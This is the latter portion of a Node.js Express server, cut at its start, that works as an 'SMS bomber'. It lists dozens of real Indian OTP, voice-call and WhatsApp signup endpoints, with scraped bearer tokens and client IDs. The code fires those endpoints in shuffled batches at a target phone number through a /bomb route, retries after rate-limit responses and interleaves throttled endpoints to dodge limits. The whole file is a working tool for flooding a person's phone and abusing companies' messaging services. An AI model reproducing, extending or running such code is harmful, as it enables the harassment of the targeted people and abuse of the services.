            "shop_name": "wrogn-website.myshopify.com"
        },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "Entri",
        url: "https://entri.app/api/v3/users/check-phone/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "UdyogPlus",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },
    {
        name: "RelianceRetail_New",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY",
            "content-type": "application/json",
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/"
        },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "Aakash_Anthe",
        url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } })
    },
    {
        name: "Tyreplex",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "ServeTel",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "IIFL",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.iifl.com",
            "referer": "https://www.iifl.com/personal-loans",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },
    {
        name: "CityMall_Web",
        url: "https://citymall.live/web-api/auth/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "host": "citymall.live",
            "origin": "https://citymall.live",
            "referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Gokwik_New",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3MzMxODk3NiwiZXhwIjoxNzczMzE5MDM2fQ.JzLZU2gjI0EBtokMC08rF20PCf4nL-NxxmoxXzHb6Dc",
            "content-type": "application/json",
            "gk-merchant-id": "19g6ilhzwnelw",
            "gk-platform": "shopify",
            "gk-request-id": "44fa696d-db10-4fb4-8b31-84baaeb0c3aa",
            "gk-signature": "394259",
            "gk-timestamp": "59110632",
            "gk-udf-1": "4479",
            "gk-version": "20260305172819153",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },

    // ============================================================
    // 🚫 NAYI RATE LIMITED APIs — 20 APIs — Rate Limited
    // ============================================================
    {
        name: "RojgarKaro_SendOTP",
        url: "https://rojgarkaro.in/api/auth/sendOTP",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://rojgarkaro.in",
            "Referer": "https://rojgarkaro.in/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, isSessionActive: false }),
        rateLimit: true
    },
    {
        name: "FundsBull",
        url: "https://backend.fundsbull.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundsbull.com",
            "Referer": "https://fundsbull.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone }),
        rateLimit: true
    },
    {
        name: "Penpencil_GetOTP",
        url: "https://api.penpencil.co/v1/users/get-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "client": "hasura",
            "client_type": "WEB",
            "origin": "https://store.pw.live",
            "referer": "https://store.pw.live/",
            "randomid": "d6c503fb-9ed9-ee6d-ddde-319d99b08793",
            "suborgid": "SUB-PWST002",
            "version": "0.0.1"
        },
        data: (phone) => JSON.stringify({ username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" }),
        rateLimit: true
    },
    {
        name: "NoBroker_OTP",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone=%2B91{phone}" },
        rateLimit: true
    },
    {
        name: "Moneyview",
        url: "https://pwa.gw.moneyview.in/uis/pwa/generate-otp",
        method: "POST",
        headers: {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymR7z7x8fbdmHNVcw",
            "Origin": "https://moneyview.in",
            "Referer": "https://moneyview.in/"
        },
        data: (phone) => `------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="key"\r\n\r\nMOBILE\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${phone}\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="source"\r\n\r\npwa\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw--\r\n`,
        rateLimit: true
    },
    {
        name: "Freedo",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone }),
        rateLimit: true
    },
    {
        name: "SalaryBolt",
        url: "https://backend.salarybolt.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "Penpencil_Resend",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
            "origin": "https://www.pw.live",
            "referer": "https://www.pw.live/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" }),
        rateLimit: true
    },
    {
        name: "Cosmofeed",
        url: "https://prod.api.cosmofeed.com/api/user/authenticate",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "referer": "https://superprofile.bio/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, countryCode: "+91", data: { email: "abcd2@gmail.com" }, authScreen: "signup-screen", userIsConvertingToCreator: false }),
        rateLimit: true
    },
    {
        name: "Sephora",
        url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==",
            "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b",
            "x-fp-date": "20260108T112314Z",
            "x-fp-sdk-version": "3.3.2",
            "Origin": "https://sephora.in",
            "Referer": "https://sephora.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" }),
        rateLimit: true
    },
    {
        name: "BlinkrLoan",
        url: "https://backend.blinkrloan.com/api/user/v3/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "withCredentials": "true",
            "Origin": "https://www.blinkrloan.com",
            "Referer": "https://www.blinkrloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" }),
        rateLimit: true
    },
    {
        name: "FundoBaba",
        url: "https://backend.fundobaba.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundobaba.com",
            "Referer": "https://fundobaba.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "DuniyaFinance",
        url: "https://backend.duniyafinance.in/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://duniyafinance.com",
            "Referer": "https://duniyafinance.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "RupeeRedee",
        url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "applicationid": "",
            "deviceid": "abc-uuid",
            "platform": "Web",
            "origin": "https://www.rupeeredee.com",
            "referer": "https://www.rupeeredee.com/"
        },
        data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" }),
        rateLimit: true
    },
    {
        name: "NaukriLoans",
        url: "https://backend.naukriloans.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://naukriloans.com",
            "Referer": "https://naukriloans.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "Apollo247",
        url: "https://apigateway.apollo247.in/auth-service/generateOtp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer 3d1833da7020e0602165529446587434",
            "content-type": "application/json",
            "origin": "https://www.apollopharmacy.in",
            "referer": "https://www.apollopharmacy.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-apollo-pre-auth-key": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZGVudGlmaWVyIjoiYTExN2NjMmZiMWIzMzAzZDhlOGY1NWZmMzBiNWUxMWY1YmZmZTFlMzFkMzcyZmM5MzJiNDc1MDk1NTIyYTFlZSIsImlzc3VlZEF0IjoxNzczMzE5MzQzODMyLCJkZXZpY2VJZCI6IkRlc2t0b3AiLCJpc3MiOiJBcG9sbG8yNDciLCJpYXQiOjE3NzMzMTkzNDMsImV4cCI6MTc3MzQwNTc0M30.CoFcO8xi4TS5ztxK2M7EvUrky2lBYcGbwN6yYP0JbRk8nqdEYLuD9TO1xNSVOGZ3z2DtiSfRQO7Zx1ih_LU1ZEwqxu_DIcj2snkYOAHxEStP5CmURJ3mzFmykfZTb-0ijfCnHKRdBGyZYqyXSaim3ruh-DEcHJGMTAS4CB4hTo7OQx4LffBFQiRPvqLL3jP0en-2dH_ZVVUz5cEEcvQ7SUW1pb8zHP99eOVlYSIxy5R_e8DtqxXnyehHf6Tz2KAMRGnT177yL7i8yB3JviHVksO5tKLUMwdSVA8_4WquIiUX3F0TsELdHwbQtojKID7E4oFojnP0O7J4Dr9kpdBW-g",
            "x-app-device-id": "Desktop",
            "x-app-os": "web"
        },
        data: (phone) => JSON.stringify({ loginType: "PATIENT", mobileNumber: "+91" + phone }),
        rateLimit: true
    },
    {
        name: "Xylem",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        headers: {
            "client-version": "300",
            "Authorization": "Bearer",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" }),
        rateLimit: true
    },
    {
        name: "1MG_New",
        url: "https://www.1mg.com/pwa-dweb-api/auth/create_token",
        method: "POST",
        headers: {
            "accept": "application/vnd.healthkartplus.v4+json",
            "content-type": "application/json",
            "hkp-platform": "Healthkartplus-0.0.1-desktopweb",
            "locale": "en",
            "origin": "https://www.1mg.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588",
            "x-1mglabs-platform": "dWeb",
            "x-access-key": "1mg_client_access_key",
            "x-city": "New Delhi",
            "x-platform": "desktop-0.0.1",
            "x-visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588"
        },
        data: (phone) => JSON.stringify({ phone: phone }),
        rateLimit: true
    },
    {
        name: "Penpencil_Register",
        url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", subOrgId: "SUB-PWLI000" }),
        rateLimit: true
    },

    // ============================================================
    // 🆕 NAYI 8 APIs — Normal / Rate Limited
    // ============================================================
    {
        name: "SabkaLoan",
        url: "https://api.sabkaloan.com/api/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://sabkaloan.com",
            "Referer": "https://sabkaloan.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "RealEstateIndia_Call",
        url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        method: "POST",
        headers: {
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" }
    },
    {
        name: "MagicBricks_Call",
        url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Career360_Call",
        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
        method: "POST",
        headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" }
    },
    {
        name: "MamaEarth_WA",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Havells_WA",
        url: "https://havells.com/otplogin/account/otploginpost/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "HeroFinCorp_WA",
        url: "https://loans.apps.herofincorp.com/api/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "SalaryBolt_New",
        url: "https://backend.salarybolt.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    }
];

// ============================================================
// ===== SPLIT APIS — Normal aur Rate Limited alag karo =====
// ============================================================

const NORMAL_APIS = APIS.filter(api => !api.rateLimit);
const RATE_LIMIT_APIS = APIS.filter(api => api.rateLimit);

console.log(`✅ Loaded ${APIS.length} total APIs`);
console.log(`   🟢 Normal APIs: ${NORMAL_APIS.length}`);
console.log(`   ⚠️  Rate Limited APIs: ${RATE_LIMIT_APIS.length}`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);
console.log(`📊 Rate Limit Skip: Har ${RATE_LIMIT_SKIP} normal APIs ke baad 1 rate limited API`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        return { status: response.status, success: true, responseTime };
    } catch (err) {
        const responseTime = Date.now() - startTime;
        
        const isRateLimit = err.response && err.response.status === 429;
        
        if (isRateLimit && api.rateLimit && retryCount < 1) {
            console.log(`  🚫 ${api.name} → 429 RATE_LIMITED, retrying once (${retryCount + 1}/1)...`);
            await new Promise(r => setTimeout(r, 3000));
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        if (retryCount < 1 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        let statusCode = null;
        if (err.response) statusCode = err.response.status;
        
        return { status: statusCode, success: false, responseTime };
    }
}

// ============================================================
// ===== BOMBING LOGIC — Normal APIs + Rate Limited Kam Call =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    
    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffledNormal = [...NORMAL_APIS];
    for (let i = shuffledNormal.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledNormal[i], shuffledNormal[j]] = [shuffledNormal[j], shuffledNormal[i]];
    }

    const shuffledRateLimit = [...RATE_LIMIT_APIS];
    for (let i = shuffledRateLimit.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledRateLimit[i], shuffledRateLimit[j]] = [shuffledRateLimit[j], shuffledRateLimit[i]];
    }

    const combined = [];
    let rateLimitIdx = 0;
    
    for (let i = 0; i < shuffledNormal.length; i++) {
        combined.push(shuffledNormal[i]);
        
        if ((i + 1) % RATE_LIMIT_SKIP === 0 && rateLimitIdx < shuffledRateLimit.length) {
            combined.push(shuffledRateLimit[rateLimitIdx]);
            rateLimitIdx++;
        }
    }
    
    while (rateLimitIdx < shuffledRateLimit.length) {
        combined.push(shuffledRateLimit[rateLimitIdx]);
        rateLimitIdx++;
    }

    console.log(`📋 Combined list: ${combined.length} APIs (Normal: ${shuffledNormal.length}, Rate Limited: ${shuffledRateLimit.length})`);

    let sent = 0;
    const BATCH_SIZE = 5;
    
    for (let i = 0; i < combined.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = combined.slice(i, Math.min(i + BATCH_SIZE, combined.length));
        
        const results = await Promise.allSettled(
            batch.map(api => makeApiCall(api, phone))
        );
        
        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            
            if (result.status === 'fulfilled' && result.value && result.value.success) {
                success++;
                sent++;
                const apiName = api.name || '';
                const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                const isRL = api.rateLimit ? '[RL]' : '';
                
                console.log(`  ✅ [${success}] ${apiName}${isRL} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
                
                if (isCall) callCount++;
                else if (isWhatsapp) whatsappCount++;
                else smsCount++;
            } else {
                const apiName = api.name || '';
                const status = result.value?.status || 'FAIL';
                const responseTime = result.value?.responseTime || 0;
                const isRL = api.rateLimit ? '[RL]' : '';
                
                if (status === 429) {
                    console.log(`  🚫 ${apiName}${isRL} → 429 RATE_LIMITED (${responseTime}ms)`);
                } else {
                    console.log(`  ❌ ${apiName}${isRL} → ${status} (${responseTime}ms)`);
                }
            }
        }
        
        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    
    return {
        success, smsCount, callCount, whatsappCount, elapsed: elapsed.toFixed(1)
    };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        rate_limit_skip: RATE_LIMIT_SKIP,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
    console.log(`🧪 Normal: ${NORMAL_APIS.length} | Rate Limited: ${RATE_LIMIT_APIS.length} | Every ${RATE_LIMIT_SKIP} normal → 1 RL`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        
        console.log(`✅ Bombing ${phone} done | Sent: ${result.success} | SMS: ${result.smsCount} | Calls: ${result.callCount} | WA: ${result.whatsappCount} | ${result.elapsed}s\n`);
        
        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            elapsed: result.elapsed + 's',
            total_apis: APIS.length,
            normal_apis: NORMAL_APIS.length,
            rate_limited_apis: RATE_LIMIT_APIS.length
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        rate_limit_skip: RATE_LIMIT_SKIP,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        normal_api_names: NORMAL_APIS.map(a => a.name),
        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name),
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 Total APIs: ${APIS.length}`);
    console.log(`   🟢 Normal APIs: ${NORMAL_APIS.length}`);
    console.log(`   ⚠️  Rate Limited APIs: ${RATE_LIMIT_APIS.length}`);
    console.log(`📊 Rate Limit Skip: Har ${RATE_LIMIT_SKIP} normal APIs ke baad 1 rate limited API`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
});
